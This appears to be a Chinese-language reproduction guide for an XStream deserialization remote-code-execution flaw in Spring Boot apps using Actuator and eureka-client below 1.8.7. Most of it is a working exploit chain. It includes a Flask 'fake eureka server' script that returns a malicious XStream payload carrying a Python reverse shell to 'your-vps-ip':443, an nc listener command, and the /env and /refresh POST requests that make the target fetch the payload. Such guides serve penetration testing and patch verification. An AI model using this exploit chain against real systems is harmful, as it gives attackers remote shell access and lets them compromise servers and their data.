Spring Boot eureka xstream deserialization rce
==============================================

一、漏洞简介
------------

#### 利用条件：

-   可以 POST 请求目标网站的 `/env` 接口设置属性
-   可以 POST 请求目标网站的 `/refresh` 接口刷新配置（存在
    `spring-boot-starter-actuator` 依赖）
-   目标使用的 `eureka-client` \< 1.8.7（通常包含在
    `spring-cloud-starter-netflix-eureka-client` 依赖中）
-   目标可以请求攻击者的 HTTP 服务器（请求可出外网）

二、漏洞影响
------------

三、复现过程
------------

#### 漏洞分析

1.  eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka
    server URL 地址
2.  refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server
    就会返回恶意的 payload
3.  目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞

### 漏洞复现

##### 步骤一：架设响应恶意 XStream payload 的网站

提供一个依赖 Flask 并符合要求的python，作用是利用目标 Linux 机器上自带的
python 来反弹shell。

使用 python
在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell
的 ip 地址和 端口号。

    springboot-xstream-rce.py
    #!/usr/bin/env python
    # coding: utf-8
    # -**- Author: LandGrey -**-

    from flask import Flask, Response

    app = Flask(__name__)


    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>', methods=['GET', 'POST'])
    def catch_all(path):
        xml = """<linked-hash-set>
      <jdk.nashorn.internal.objects.NativeString>
        <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
          <dataHandler>
            <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
              <is class="javax.crypto.CipherInputStream">
                <cipher class="javax.crypto.NullCipher">
                  <serviceIterator class="javax.imageio.spi.FilterIterator">
                    <iter class="javax.imageio.spi.FilterIterator">
                      <iter class="java.util.Collections$EmptyIterator"/>
                      <next class="java.lang.ProcessBuilder">
                        <command>
                           <string>/bin/bash</string>
                           <string>-c</string>
                           <string>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-vps-ip",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</string>
                        </command>
                        <redirectErrorStream>false</redirectErrorStream>
                      </next>
                    </iter>
                    <filter class="javax.imageio.ImageIO$ContainsFilter">
                      <method>
                        <class>java.lang.ProcessBuilder</class>
                        <name>start</name>
                        <parameter-types/>
                      </method>
                      <name>foo</name>
                    </filter>
                    <next class="string">foo</next>
                  </serviceIterator>
                  <lock/>
                </cipher>
                <input class="java.lang.ProcessBuilder$NullInputStream"/>
                <ibuffer></ibuffer>
              </is>
            </dataSource>
          </dataHandler>
        </value>
      </jdk.nashorn.internal.objects.NativeString>
    </linked-hash-set>"""
        return Response(xml, mimetype='application/xml')


    if __name__ == "__main__":
        app.run(host='0.0.0.0', port=80)

##### 步骤二：监听反弹 shell 的端口

一般使用 nc 监听端口，等待反弹 shell

    nc -lvp 443

##### 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性

spring 1.x

    POST /env
    Content-Type: application/x-www-form-urlencoded

    eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example

spring 2.x

    POST /actuator/env
    Content-Type: application/json

    {"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/example"}

##### 步骤四：刷新配置

spring 1.x

    POST /refresh
    Content-Type: application/x-www-form-urlencoded

spring 2.x

    POST /actuator/refresh
    Content-Type: application/json
